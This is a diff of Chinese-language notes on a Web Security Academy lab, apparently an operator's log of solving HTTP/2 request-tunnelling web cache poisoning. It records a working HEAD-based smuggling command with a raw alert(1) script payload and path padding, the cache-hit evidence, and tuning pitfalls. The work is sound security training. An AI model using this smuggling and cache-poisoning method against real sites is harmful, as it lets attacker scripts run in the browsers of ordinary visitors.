@@ -6,38 +6,53 @@ title: lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling
 
 > evidences: [[h2-smuggling-family]]
 
-- 题面:毒 `/` 的缓存,使每 15s 访问首页的受害者浏览器执行 `alert(1)`;前端 h2→h1 降级、"doesn't consistently sanitize incoming headers"、不复用后端连接(只剩 tunnelling)。
-- 实例(批47):https://0af5004203400b3480af12a600110039.web-security-academy.net
-- 判定:**stuck**(载荷出处与缓存面全部复证;缺"把嵌套字节垫到外层期望长度"的装配)
+- 题面:h2 请求隧道毒 `/` 的缓存,使每 15s 访问首页的受害者执行 `alert(1)`。
+- 实例(批50):https://0a2800ce0401a85880428a4b00d800c5.web-security-academy.net
+- 判定:**solved**(`academyLabBanner is-solved` + `Congratulations, you solved the lab!`,于 `/post?postId=1` 读到)
 
-## 新证据
+## 收口命令(一次即中)
 
-1. **载荷出处复证 + 关键细节:回显逐字跟随输入**。用 `:path` 发**百分号编码**的载荷 ⇒ `Location` 也返回**编码形**:
-   `GET /resources/labheader/js?%3Cscript%3Ealert(1)%3C/script%3E` → `302` + `location: /resources/labheader/js/?%3Cscript%3Ealert(1)%3C/script%3E` + `cache-control: max-age=30` + `age: 0` + `x-cache: miss` + `content-length: 0`。
-   ⇒ 批44 读到的"原样不编码"是因为当时发的是**原样字节**;要拿到可执行的裸 `<script>` 必须发裸字节,别发 `%3C`。
-2. 该 302 自身可缓存(max-age=30、X-Cache miss→hit),可作为"记在某个键上的可缓存响应"。
-3. 载体约束复核:受害者只访问 `/`,故毒必须记在 `/` 上 ⇒ 外层必须是 `HEAD /`(前端期望长度 = `/` 体长,本实例约 8.6~8.9KB),由后端过读把嵌套响应字节当成 `/` 的体;而嵌套重定向响应带 `Keep-Alive: timeout=0`(后端随即关连接)⇒ **垫片请求不可行**,嵌套响应自身必须 ≥ 外层期望长度 ⇒ 查询串要垫到 ~8.4KB。
-4. 新件能力(本批可用的杠杆):`h2_req --hdr2-file <FILE>` / `--data-file <FILE>` / `--pad-to N` ⇒ 大注入体可以**由文件提供**,不必手写进 argv(批44 卡在"没有件能塞 8.4K")。方向:生成一个 8.4KB 的 `:path` 垫片文件,外层 `HEAD /`。
+```
+M = 活测 GET / 的 content-length(本实例 8566)
+h2_req <inst>/ --method HEAD \
+  --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script>' \
+  --pad-path-to 9000 --read-ms 6000
+```
 
-## 未决面
+回执:200、`x-cache: miss`、`content-length: 8566`,body = 嵌套 302 原文
+`HTTP/1.1 302 Found\r\nLocation: /resources/labheader/js/?<script>alert(1)</script>/;p/;p…`。
+随后普通 `GET /` → **`x-cache: hit`** 且 body 同上 ⇒ 毒已入缓存;受害者的浏览器把该
+`text/html` body 当 HTML 解析,执行其中的裸 `<script>alert(1)</script>`。
 
-- 装配未跑通:`:path` 需要 `--hdr2-file` 的字节形态(逐字含 CRLF 的伪头)还是 `--path @file` 仍未定;另需现测本实例 `/` 的精确体长(前端期望长度)才能算出垫片字节数。
-- 下一个可证伪的判据沿用 lab 2 的记账面:外层 `HEAD /` + 注入,若前端报 `500 Received only N of expected M bytes of data` 就能直接读出"嵌套响应是否够长",不需要猜。
+## 机制
 
-## 新证据(批49:外层期望长度精确值 + 边缘 cookie 门)
+外层 `HEAD /` 让后端对 `/` 只回头(无 body);前端按自己的期望长度 8566 继续读字节,把随即
+到达的**嵌套 302 响应原文字节**当成 `/` 的体。`max-age=30` 且本次未命中 ⇒ 记入 `/` 的键。
+cached 应答 content-type 仍是 `text/html`,故 302 原文里的裸 `<script>` 被浏览器执行 ⇒ 不需要
+把毒伪装成 JS/HTML 页。
 
-- `http_dump <inst>/` → **200, content-length: 8419**,`cache-control: max-age=30`,`x-cache: miss`,`age: 0` ⇒ 外层 `HEAD /` 期望长度 = **8419**(批47 估的 8.6~8.9K 精确化)。嵌套 302 必须自身 ≥ 8419,垫片字符数 = 8419 − 302 固定头长,可算。
-- 边缘门:手造 `Cookie: _lab=1` → **400 `Client Error: Too Nosy`**("Tampering with the _lab cookie is not required")⇒ `_lab` 只由边缘下发,不可伪造(批46 结论的加强版)。
-- `h2_req --pad-to N` 只垫 **DATA**,不垫 `:path`;大 `:path` 得走 `--hdr2-file`(把整条注入塞进 header NAME)或由件生成 ⇒ 8.4KB 垫片的**装配件仍缺**(下一手:写一个「按目标长度生成垫片并直发 h2 :path」的件,而不是手打字节)。
+## 四个坑(批50 实测)
 
-判定仍 **stuck**(载荷出处与缓存面已复证,缺的是垫片装配)。
+1. **垫片必须落内层 URI 内(query)**。`h2_req --pad-path-to N` 把整条 `:path` 截到 N 字节;
+   若 `:path` 以内层 URI 结尾(不写 ` HTTP/1.1\r\nHost:`)则垫片正好落在内层 query 里,嵌套
+   302 的 Location 逐字回显内层 URI ⇒ 垫 1 字节长 1 字节。**判据 = 嵌套长 ≥ M**:pad 9000
+   使 Location ≈8.7KB > 8566,恰好够(pad 太小 → 短读失败)。
+2. **`:path` 不得超 HEADERS 帧上限 16384B**:`tunnel_variant_scan --pad-to 20000` 单帧装不下
+   ⇒ 前端 GOAWAY(无响应,易误读成"没注入")。~9000 安全。
+3. **`tunnel_variant_scan --converge` 本例读不出且自坑**:其 `clean` 直发格会先把 `/` 写进缓存,
+   随后注入格全成 **cache HIT**(200/8566)⇒ 无记账行、无注入效果,`pass=false` 是假阴。
+   本例前端短读回 **`500 Communication timed out`**,不是 ACL 题的 `Received only N of expected M`
+   —— 记账口径按 lab 不同。故用单发 `h2_req` + 自算 M。
+4. **判读纪律**:毒在缓存时 `banner_verdict` 读不到 `is-solved`(它 GET / 拿到毒 body);改读另一页
+   lab header(本例 `/post?postId=1`,未缓存)⇒ `academyLabBanner is-solved`。
 
 ## 复现命令
 
 ```
-range_launch launch 97E46BF5…DEFCE4F1 --jar ~/.pi-rs/agent/chrome-jar.json
-h2_req "https://<inst>/" --method GET --path '/resources/labheader/js?<script>alert(1)</script>'   # 裸字节才有裸回显
-h2_req "https://<inst>/" --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script><PAD> HTTP/1.1\r\nHost: <inst>\r\n' --read-ms 3000
+http_dump <inst>/                                  # M = content-length
+h2_req <inst>/ --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script>' --pad-path-to 9000 --read-ms 6000
+http_dump <inst>/ --out /tmp/hit.html              # x-cache: hit + 毒 body
+http_dump '<inst>/post?postId=1' --out /tmp/b.html # is-solved 横幅
 ```
 
 ## 关系
